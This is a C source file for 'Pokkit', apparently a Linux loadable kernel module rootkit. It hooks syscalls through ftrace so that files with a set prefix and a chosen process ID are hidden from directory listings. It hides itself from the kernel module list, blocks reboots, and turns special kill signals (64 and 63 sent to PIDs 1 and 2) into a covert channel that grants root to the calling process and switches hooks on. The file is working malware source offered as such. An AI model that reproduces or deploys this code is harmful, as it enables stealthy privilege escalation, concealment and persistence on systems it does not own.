#include <linux/init.h> // macros to mark up functions
#include <linux/module.h> // core header for loading lkms into the kernel
#include <linux/kernel.h> // types, macros, functions for kernel
#include <linux/kallsyms.h> // functions for kallsyms actions
#include <linux/unistd.h> // syscalls macros (checks for 32 bit and defines accordinly)
#include <asm/paravirt.h>
#include <linux/dirent.h> // dirent
#include <linux/slab.h>
#include <linux/cred.h> // credentials
#include <linux/syscalls.h>
#include <linux/uaccess.h> // copy to/from user space
#include <linux/reboot.h> // reboot function
#include <linux/sched.h>
#include "kite_hook.h"
#include "device_handler.h"

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Pokkit");
MODULE_AUTHOR("NondairyDig");
MODULE_VERSION("0.5");



static int hidden = 0; // flag if module is hidden
static struct list_head *prev_module;
unsigned long *__SYS_CALL_TABLE; // variable for a pointer to the syscall table

static void set_root(void){
    struct cred *p_creds;
    p_creds = prepare_creds(); // get a COPY of the current task's credentials
    if(p_creds == NULL){
        return;
    }
    // alter the copy to root ids
    p_creds->uid.val = p_creds->gid.val = 0;
    p_creds->euid.val = p_creds->egid.val = 0;
    p_creds->suid.val = p_creds->sgid.val = 0;
    p_creds->fsuid.val = p_creds->fsgid.val = 0;

    commit_creds(p_creds); // commit the credentials to the task
}


static void show_mod(void) {
    //add to the modules linked list the current module after the one it already had been attached
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}


static void hide_mod(void) {
    // keep the module that this module is attached to after in the modules linked list, to reattach later
    prev_module = THIS_MODULE->list.prev;
    // delete this module from the list by linking previous module to the next(thats behind the scenes)
    list_del(&THIS_MODULE->list);
    hidden = 1;
}


#ifdef PTREGS_SYSCALL_STUB
static asmlinkage int hack_getdents64(const struct pt_regs *regs){
    // get the dirent pointer in user space from the register
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    long error;

    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int ret = orig_getdents64(regs);// get the original function's return value (size of dirent record)
    dirent_ker = kzalloc(ret, GFP_KERNEL); // allocate memory to keep the dirents inside to work with within the program

    // check if empty directory or not enough space to allocate
    if((ret <= 0) || ( dirent_ker == NULL)){
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret); // get the dirent itself from the user space in dirent address
    if(error){
        goto done;
    }

    while (offset < ret) // until reached full dirent record length
    {
        current_dir = (void *)dirent_ker + offset;
        // check if name of directory is prefixed with th prefix we want to hide or the pid we want to hide and that the pid is not empty
        if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0 && strncmp(hide_pid, "", NAME_MAX) != 0)){
            // if the current dir is matched and first in line, keep offset and shorten the record of dirents to start from the next one
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen; // set record length minus the matched dirent
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret); //move record start to the second dirent
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen; // skip this dirent by increasing prevoius one's length record to make system skip to next one
        }
        else
        {
            previous_dir = current_dir; // if not matched, progress
        }
        
        offset += current_dir->d_reclen; // incriment offset to next dirent

    }
    
    error = copy_to_user(dirent, dirent_ker, ret); // copy the new dirents record to user dirent pointer in user space
    if(error){
        goto done;
    }

    done:
        kfree(dirent_ker); // free the allocated space for dirent record
        return ret; // return size of returned record
}

static asmlinkage int hack_getdents(const struct pt_regs *regs){
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    long error;

    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    
    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ((ret <= 0) || (dirent_ker == NULL))
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;
        if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0 || (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0 && strncmp(hide_pid, "", NAME_MAX) != 0))
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }
        offset += current_dir->d_reclen;
    }
    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

    done:
        kfree(dirent_ker);
        return ret;

}
#else
#endif


#ifdef PTREGS_SYSCALL_STUB
static asmlinkage int hack_reboot(const struct pt_regs *regs){
    int magic1 = regs->di;
    int magic2 = regs->si;
    unsigned int cmd = regs->dx;
    void *arg = regs->r10;
    
    return -1; //return error when trying to reboot
}
#else
static asmlinkage int hack_reboot(int magic1, int magic2, unsigned int cmd, void* arg){
    return -1;
}
#endif

#ifdef PTREGS_SYSCALL_STUB
static asmlinkage long hack_kill(const struct pt_regs *regs); // pretty self explanatory, in the README, activate and hook desired capabilities
static struct ftrace_hook ACTIVE_HOOKS[] = {
    HOOK("__x64_sys_getdents64", hack_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hack_getdents, &orig_getdents),
    HOOK("__x64_sys_kill", hack_kill, &orig_kill),
    HOOK("__x64_sys_reboot", hack_reboot, &orig_reboot)
};
#else
static asmlinkage long hack_kill(pid_t pid, int sig);
static ftrace_hook ACTIVE_HOOKS[] = {
    HOOK("sys_getdents64", hack_getdents64, &orig_getdents64),
    HOOK("sys_getdents", hack_getdents, &orig_getdents),
    HOOK("sys_kill", hack_kill, &orig_kill),
    HOOK("sys_reboot", hack_reboot, &orig_reboot)
};
#endif
#ifdef PTREGS_SYSCALL_STUB
static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self explanatory, in the README, activate and hook desired capabilities
    int sig = regs->si;
    int pid = regs->di;
    if ( (sig == 64) && (pid == 1))
    {
        if(hidden == 0){
            printk(KERN_INFO "Hide pookkit\n");
            hide_mod();
        }
        else{
            printk(KERN_INFO "Show pookkit\n");
            show_mod();
        }
    }
    else if ((sig == 64) && (pid == 2)){
        printk(KERN_INFO "Setting root for calling process\n");
        set_root();
        return 0;
    }
    else if ((sig == 63) && (pid == 1)){
        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents64") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
        }
        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_getdents") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
        }
    }
    else if ((sig == 63) && (pid == 2)){
        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_reboot") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
        }
    }
    printk(KERN_INFO "kill %d, %d\n", sig, pid);
    return orig_kill(regs);
}
#else
static asmlinkage long hack_kill(pid_t pid, int sig){
    if ( (sig == 64) && (pid == 1))
    {
        if(hidden == 0){
            printk(KERN_INFO "Hide pookkit\n");
            hide_mod();
        }
        else{
            printk(KERN_INFO "Show pookkit\n");
            show_mod();
        }
    }
    else if ((sig == 64) && (pid == 2)){
        printk(KERN_INFO "Setting root for calling process\n");
        set_root();
        return 0;
    }
    else if ((sig == 63) && (pid == 1)){
        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents64") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents64);
        }
        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_getdents") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_getdents);
        }
    }
    else if ((sig == 63) && (pid == 2)){
        if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
            printk(KERN_ERR "error hooking syscall %d\n", __NR_reboot);
        }
    }
    return orig_kill(pid, sig);
}
#endif


static int __init mod_init(void){
    printk(KERN_INFO "Activated pookkit, Initializing & Hooking Kill\n");
    misc_register(&controller); // register the device for interaction within filesystem
    if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "__x64_sys_kill") == 1){ //hook the kill function for interaction with the lkm
        printk(KERN_ERR "error hooking syscall %d\n", __NR_kill);
    }
    return 0;
}


static void __exit mod_exit(void){
    fh_remove_hooks(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE); //cleanup the hooks and revert them
    misc_deregister(&controller); // deregister the device controller
    printk(KERN_INFO "pookkit: exit\n");
}


module_init(mod_init);
module_exit(mod_exit);